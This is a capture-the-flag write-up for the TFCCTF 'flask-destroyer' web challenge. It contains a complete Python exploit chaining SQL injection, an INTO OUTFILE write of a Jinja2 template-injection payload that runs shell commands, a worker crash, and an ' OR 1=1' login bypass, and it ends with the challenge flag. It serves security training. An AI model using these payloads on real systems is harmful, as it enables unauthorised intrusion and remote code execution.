https://ctftime.org/event/2423

# flask-destroyer (web)

flask sqli

## Solution

There is an sqli on login, and `secure_file_priv = ""`.
So we can upload any file we want.

There is just the problem that flask hotloading is off, so we cannot load new templates.

The solution is crashing the worker so when it restarts it loads the new templates in.
The intented way to crash the worker is abusing `strtok` from libc, `asdsad:asda:` segfaults it

The full exploit then:
- upload template
- crash
- get new template

```python
#!/usr/bin/env python3
import requests
import time
import string
from urllib.parse import quote_plus

# REMOTE = "http://0.0.0.0:1337/"
REMOTE = "http://challs.tfcctf.com:32006/"

def create_file():
    payload = '''" UNION SELECT '{{ dict.__base__.__subclasses__()[379]("cat $(find /tmp -type f)",shell=True,stdout=-1).communicate()[0] }}', '', '' into outfile '/destroyer/app/templates/a.html'-- '''
    login = f'username=1&password={payload}&vibe=y'
    res = requests.post(REMOTE + 'login', headers={'Content-Type':'application/x-www-form-urlencoded'}, data=login, proxies={
        'http': 'http://0.0.0.0:8080',
        'https': 'https://0.0.0.0:8080'
    })


def crash():
    payload = '''" UNION SELECT 'this works', 'sdsadasd', 'bla:'-- '''
    login = f'username=1&password={payload}&vibe=y'
    res = requests.post(REMOTE + 'login', headers={'Content-Type':'application/x-www-form-urlencoded'}, data=login, proxies={
        'http': 'http://0.0.0.0:8080',
        'https': 'https://0.0.0.0:8080'
    })

def get():
    payload = '''" OR 1=1-- '''
    login = f'username=1&password={payload}&vibe=y'
    with requests.Session() as ses:
        ses.post(REMOTE + 'login', headers={'Content-Type':'application/x-www-form-urlencoded'}, data=login, proxies={
            'http': 'http://0.0.0.0:8080',
            'https': 'https://0.0.0.0:8080'
        })
        res = ses.get(REMOTE + 'a.html', proxies={
            'http': 'http://0.0.0.0:8080',
            'https': 'https://0.0.0.0:8080'
        })
        print(f"DEBUGPRINT[4]: go.py:37: res.text={res.text}")

create_file()
time.sleep(2)
crash()
time.sleep(5)
get()
```

## Flag
`TFCCTF{Cr4Sh_g0_bRbRbRbRbR}`

shafouz 2024/08/03
